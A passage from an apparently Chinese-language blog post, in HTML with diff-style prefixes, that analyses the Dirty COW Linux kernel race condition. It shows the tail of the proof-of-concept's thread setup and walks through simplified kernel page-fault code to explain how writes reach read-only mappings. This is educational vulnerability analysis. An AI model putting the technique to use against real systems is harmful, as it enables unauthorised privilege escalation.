class="string">&quot;mmap %zx\n\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>lseek: 按照偏移更改文件描述符的指针，SEEK_SET 表示将指针指向 map</li>
+<li>fstat: 获得文件描述符指向的文件的更多信息，如文件大小等</li>
+<li>madvise: 将自己的主动控制内存的行为告知操作系统内核</li>
+<li>pthread_join：表示主线程”main”会一直等待直到 ph1、ph2 这个线程执行完毕自己才结束</li>
+</ul>
+<p>main 函数首先以只读的方式打开要修改的文件；以只读和私有方式映射到内存中；再启动两个线程，<code>procselfmemThread</code> 线程不断<strong>写</strong>那段内存，<code>madviseThread</code> 线程不断<strong>释放</strong>那段内存。</p>
+<h2 id="源码及漏洞分析"><a href="#源码及漏洞分析" class="headerlink" title="源码及漏洞分析"></a>源码及漏洞分析</h2><p>这个节选了部分会用到的源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	retry:</span><br><span class="line">		...</span><br><span class="line">        cond_resched();</span><br><span class="line">		page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			   <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">			   <span class="keyword">goto</span> retry;</span><br><span class="line">			...</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">follow_page_mask(...,flag,...)&#123;</span><br><span class="line">	<span class="comment">//这个函数会走 页一集目录-&gt;二级目录-&gt;页表项 的传统页式内存的管理流程</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> follow_page_pte(...,flag,...); <span class="comment">//走到了流程的第三步：寻找页表项</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">follow_page_pte(...,flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">//如果获取页表项时要求页表项所指向的内存映射具有写权限，但是页表项所指向的内存并没有写权限。则会返回空</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123; <span class="comment">//FOLL_WRITE = 1</span></span><br><span class="line">       pte_unmap_unlock(ptep, ptl);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取页表项的请求不要求内存映射具有写权限的话会返回页表项</span></span><br><span class="line">	<span class="keyword">return</span> pages;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	faultin_page(vma,)&#123;</span><br><span class="line">		...</span><br><span class="line">		<span class="comment">//处理page fault</span></span><br><span class="line">		ret = handle_mm_fault();</span><br><span class="line">		<span class="comment">//这个if对应了上一个函数的注释，如果是因为映射没有写权限导致的获取页表项失败，会去掉flags中的FOLL_WRITE标记，从而使的获取页表项不再要求内存映射具有写的权限。</span></span><br><span class="line">		<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">	__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">	handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line">	<span class="comment">//页表为空，说明缺页。调用do_fault调页</span></span><br><span class="line">	<span class="keyword">if</span> (!fe-&gt;pte) &#123;</span><br><span class="line">	      ... </span><br><span class="line">         <span class="keyword">return</span> do_fault(fe);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//页表不为空，但是要写入的页没有写权限，这时可能需要COW</span></span><br><span class="line">   <span class="keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">   		<span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">			<span class="keyword">return</span> do_wp_page(fe, entry);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_fault(fe)&#123;</span><br><span class="line">	<span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">		<span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line">	<span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_cow_fault(fe,pgoff)&#123;</span><br><span class="line">	<span class="comment">//执行COW， 并更新页表为COW后的页表。</span></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// __do_fault会将内存</span></span><br><span class="line">	ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);</span><br><span class="line">	... </span><br><span class="line">		copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);</span><br><span class="line">	ret |= alloc_set_pte(fe, memcg, new_page);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_read_fault(fe,pgoff)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">//不执行COW，直接映射文件。</span></span><br><span class="line">	__do_fault(fe, pgoff, <span class="literal">NULL</span>, &amp;fault_page, <span class="literal">NULL</span>);</span><br><span class="line">	...</span><br><span class="line">	ret |= alloc_set_pte(fe, <span class="literal">NULL</span>, fault_page);</span><br><span class="line">	...</span><br><span class="line">	ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_set_pte(fe,...)&#123;</span><br><span class="line">	<span class="keyword">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line">	<span class="comment">//如果执行了COW，设置页表时会将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line">	<span class="keyword">if</span> (write)</span><br><span class="line">		entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">do_wp_page(fe,entry)&#123;</span><br><span class="line">	 ....</span><br><span class="line">	 <span class="comment">//内核通过检查，发现COW操作已经在缺页处理时完成了，所以不再进行COW，而是直接利用之前COW得到的页表项</span></span><br><span class="line">	 <span class="keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wp_page_reuse()&#123;</span><br><span class="line">	 <span class="comment">//将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line">	 entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_mkwrite()&#123;</span><br><span class="line">	<span class="comment">//这就是maybe_mkwrite不会标记页为可写的原因，因为这个页为只读页。所以不满足if的条件</span></span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		pte = pte_mkwrite(pte);</span><br><span class="line">	<span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>再对照着 POC 可以知道，我们 mmap 了一段区域( <code>map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0)</code> )，先看 <strong>procselfmemThread</strong> 线程，往 <code>/proc/self/mem</code> 进行读写操作，本质是调用了一系列函数：<code>mem_write</code> -&gt; <code>mem_rw</code> -&gt; <code>access_remote_vm</code> -&gt; <code>__access_remote_vm</code> ，<strong>__access_remote_vm</strong> 中的 <strong>get_user_pages</strong> 获取需要写入的内存页，<strong>get_user_pages **函数会调用 **follow_page_mask</strong> 函数寻找内存页对应的页表项。</p>
+<p>因为这是 mmap 后第一次对 map 进行操作，所以 map 所对应的页表为空，接着经过 if 判断，调用 <strong>faultin_page</strong> 函数。</p>
+<p>对应的函数简化如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	retry:</span><br><span class="line">		...</span><br><span class="line">		page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			   <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">			   <span class="keyword">goto</span> retry;</span><br><span class="line">			...</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>faultin_page **函数会调用 **handle_mm_fault</strong> 进行缺页处理。缺页处理时，如果页表为空，内核会调用 <strong>do_fault</strong> 函数调页，这个函数会检查是否是因为<strong>内存写</strong>造成的缺页以及该内存是否是以 private 方式 mmap 的内存，如果是，则会进行 COW 操作，更新页表为 COW 后的页表。并将返回值的 <strong>FAULT_FLAG_WRITE 位</strong> 置为1，也就是触发缺页中断，并将页面标记为脏。</p>
+<p>对应的函数简化如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(vma,)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">//处理page fault</span></span><br><span class="line">	ret = handle_mm_fault();</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">	__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">	handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line">	<span class="comment">//页表为空，说明缺页。调用do_fault调页</span></span><br><span class="line">	<span class="keyword">if</span> (!fe-&gt;pte) &#123;</span><br><span class="line">	      ... </span><br><span class="line">         <span class="keyword">return</span> do_fault(fe);</span><br><span class="line">   &#125;</span><br><span class="line">	...	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_fault(fe)&#123;</span><br><span class="line">	<span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">		<span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line">	<span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_cow_fault(fe,pgoff)&#123;</span><br><span class="line">	<span class="comment">//执行COW,并更新页表为COW后的页表。</span></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// __do_fault会将内存</span></span><br><span class="line">	ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);</span><br><span class="line">	... </span><br><span class="line">		copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);</span><br><span class="line">	ret |= alloc_set_pte(fe, memcg, new_page);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_set_pte(fe,...)&#123;</span><br><span class="line">	<span class="keyword">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<span class="comment">//FAULT_FLAG_WRITE = 1</span></span><br><span class="line">	<span class="comment">//如果执行了COW，设置页表时会将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line">	<span class="keyword">if</span> (write)</span><br><span class="line">		entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_mkwrite()&#123;</span><br><span class="line">	<span class="comment">//这就是maybe_mkwrite不会标记页为可写的原因，因为这个页为只读页。所以不满足if的条件</span></span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		pte = pte_mkwrite(pte);</span><br><span class="line">	<span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应的流程图如下(这里是直接拿网上师傅的图)：</p>
+<p>这幅图表示第一次 mmap，此时文件已经从磁盘上加载到了内存中(即文件对应的 page cache) ，但是进程相应的页表还没有建立。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651319895175690/f8107b99f5987084fbd18724daafa6f683cabc79.png" alt="dirtycow1"></p>
+<p>之后尝试访问这个页，但发现页表项为空，所以触发一个缺页中断，因为映射的属性是只读并且私有，而我们要写，所以会触发COW。并标记页表为只读(RO)和脏(DIRTY)。</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651320033134982/e50598611ce40e0a5ea461d85c8e7068cf148594.png" alt="dirtycow2"></p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>返回后，因为现在页表已经设置好了，所以第二次 <strong>get_user_pages **会调用 **follow_page_mask</strong> 寻找页表项，<strong>follow_page_mask</strong> 会调用 <strong>follow_page_pte</strong> 函数。这个函数会通过 flag 参数的 <strong>FOLL_WRITE</strong> 位是否为 1 来判断<strong>该页是否被要求具有写权限</strong>，通过页表项的 <strong>VM_WRITE</strong> 位是否为 1 来判断<strong>该页是否可写</strong>。</p>
+<p>因为此时我们 mmap 出来的 map 带的属性是 <strong>PROT_READ</strong> 和 <strong>MAP_PRIVATE</strong>，所以此时的 <strong>VM_WRITE</strong> 为 0 ，即该页不可写，而我们要求页表是可写的，对应 <strong>FOLL_WRITE</strong> 为 1，所以会返回 0 ，再一次触发中断。</p>
+<p>对应的函数简化如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	retry:</span><br><span class="line">		...</span><br><span class="line">        cond_resched();</span><br><span class="line">		page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">		...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">follow_page_mask(...,flag,...)&#123;</span><br><span class="line">	<span class="comment">//这个函数会走 页一集目录-&gt;二级目录-&gt;页表项 的传统页式内存的管理流程</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> follow_page_pte(...,flag,...); <span class="comment">//走到了流程的第三步：寻找页表项</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">follow_page_pte(...,flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">//如果获取页表项时要求页表项所指向的内存映射具有写权限，但是页表项所指向的内存并没有写权限。则会返回空</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123; <span class="comment">//FOLL_WRITE = 1</span></span><br><span class="line">       pte_unmap_unlock(ptep, ptl);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取页表项的请求不要求内存映射具有写权限的话会返回页表项</span></span><br><span class="line">	<span class="keyword">return</span> pages;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>follow_page_pte</strong> 函数返回 0 ，使得 page 为 0 ，再一次进入 <strong>faultin_page</strong> 函数，<strong>faultin_page</strong> 函数调用 <strong>handle_mm_fault</strong> 函数，然后到 <strong>handle_pte_fault</strong> 函数，因为这一次页表不为空，所以会检查是否是因为页没有写权限导致的中断，如果是因为没有写权限中断，就会调用 <strong>do_wp_page</strong> 函数，<strong>do_wp_page</strong> 函数会检查 COW 操作是否已经进行过(整合的函数没有这一步，具体要去看源码)，因为在 step1 就已经 COW 过了，所以这里会直接利用之前 COW 得到的页表项，之后 <strong>handle_mm_fault</strong> 的返回值的 <strong>VM_FAULT_WRITE</strong> 位会被置为1。</p>
+<p>接着 <strong>faultin_page</strong> 会通过判断 <strong>handle_mm_fault</strong> 返回值的 <strong>VM_FAULT_WRITE</strong> 位是否为1来判断COW是否顺利完成，以及通过页表项 <strong>VM_WRITE **位是否为1来判断该内存是否可写。如果判断出来 COW 已完成并且页表项不可写，就会将 **FOLL_WRITE</strong> 置 0 ，<strong>从而使获取的页表项不再要求具有写权限</strong>，并返回 <strong>get_user_pages</strong>。</p>
+<p>对应函数简化如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">	...</span><br><span class="line">	retry:</span><br><span class="line">		...</span><br><span class="line">        cond_resched();</span><br><span class="line">		page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			   <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">			   <span class="keyword">goto</span> retry;</span><br><span class="line">			...</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	faultin_page(vma,)&#123;</span><br><span class="line">		...</span><br><span class="line">		<span class="comment">//处理page fault</span></span><br><span class="line">		ret = handle_mm_fault();</span><br><span class="line">		<span class="comment">//这个if对应了上一个函数的注释，如果是因为映射没有写权限导致的获取页表项失败，会去掉flags中的FOLL_WRITE标记，从而使的获取页表项不再要求内存映射具有写的权限。</span></span><br><span class="line">		<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">	__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">	handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line">    ...</span><br><span class="line">   <span class="comment">//页表不为空，但是要写入的页没有写权限，这时可能需要COW</span></span><br><span class="line">   <span class="keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">   		<span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">			<span class="keyword">return</span> do_wp_page(fe, entry);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_wp_page(fe,entry)&#123;</span><br><span class="line">	 ....</span><br><span class="line">	 <span class="comment">//内核通过检查，发现COW操作已经在缺页处理时完成了，所以不再进行COW，而是直接利用之前COW得到的页表项</span></span><br><span class="line">	 